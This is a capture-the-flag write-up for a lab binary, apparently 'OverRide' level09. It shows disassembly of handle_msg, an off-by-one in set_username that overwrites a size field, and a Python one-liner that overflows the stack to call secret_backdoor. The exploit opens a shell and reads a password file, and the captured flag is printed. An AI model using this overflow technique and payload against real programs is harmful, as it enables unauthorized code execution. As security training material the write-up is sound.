### Download binary
``scp -P4242 level06@192.168.31.33:/home/users/level06/level06 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (refer to source code)
We quickly find that there is a dead code function which does exactly what we want :
**secret_backdoor**.
The analysis of the binary is quite complex and require both GDB and Guidra.

By disasembling the function **handle_msg** we find that the binary use a struct, this one :
````
typedef struct	s_struct_message
{
	char	message[140];
	char	username[40];
	size_t	size;
}				t_struct_message;
````

``(gdb) disas handle_msg``
[...]

This instruction reserves 0xc0 (192 bytes) on the stack for local variables and possibly for some temporary arguments. 192 bytes reserved because there is a 16 byte alignment, the structure may be a little smaller in reality.
````
0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
````

These two instructions determine a memory address based on the current stack position (%rbp).
%rax will contain an address located at 0x8c (140 bytes) from the start of the placeholder. This is what allows us to deduce that our first string (message) is 140 bytes long.
````
0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax
0x00005555555548d2 <+18>:	add    $0x8c,%rax
````

Then there is a zeroing of part of this memory, 40 bytes, which tells us the size of our second string (username):
````
0x00005555555548d8 <+24>:	movq   $0x0,(%rax)
0x00005555555548df <+31>:	movq   $0x0,0x8(%rax)
0x00005555555548e7 <+39>:	movq   $0x0,0x10(%rax)
0x00005555555548ef <+47>:	movq   $0x0,0x18(%rax)
0x00005555555548f7 <+55>:	movq   $0x0,0x20(%rax)
````

Here we understand that the structure is passed to the function set_username
````
0x0000555555554906 <+70>:	lea    -0xc0(%rbp),%rax
0x000055555555490d <+77>:	mov    %rax,%rdi
0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
````

The flaw is here:
````
for (int i = 0; i <= 40 && struct_message->username[i] != '\0'; i++)
{
	struct_message->username[i] = username[i];
}
````

In this part of the code, it is the **first 41 characters** of the username that are copied, while the buffer is only 40 bytes long.
The 41st character will therefore overwrite the value of **size** contained in the structure.

By changing the size, we will influence:
````
strncpy(struct_message->message, (char *)msg_buffer, struct_message->size);
````
Causing a buffer overflow. We will thus be able to overwrite the EIP and execute our secret_backdoor function.


----

### Gathering infos to build the payload

Locate the **secret_backdoor** function address:  
``(gdb) b main``  
[...]  
``(gdb) r``  
[...]  
``(gdb) info function secret_backdoor``  
>0x000055555555488c  secret_backdoor  

----

### Building of payload

+ Filling the username buffer			-> 'A' * 40
+ New desired size (max 255)			-> '\xff' (255 en hexa)
+ ENTER 								-> '\n'
+ Filling message buffer + padding		-> 'A' * **???**
+ Adress of secret_backdoor				-> '\x8c\x48\x55\x55\x55\x55\x00\x00'

**Finding EIP**

Starting from 192 bytes because we know that the memory allocated for the structure is 192, we will carry out tests, by slice of 4 bytes, until the program stops segfault, and we find:  
``level09@OverRide:~$ (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat -) | ./level09``  
-> No segfault it looks like EIP is at 200 offset.  
  
----

### Bypassing security

(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat -) | ./level09
[...]  
``/bin/sh``  
``whoami``  
>end  

``cat /home/users/end/.pass``  
>j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
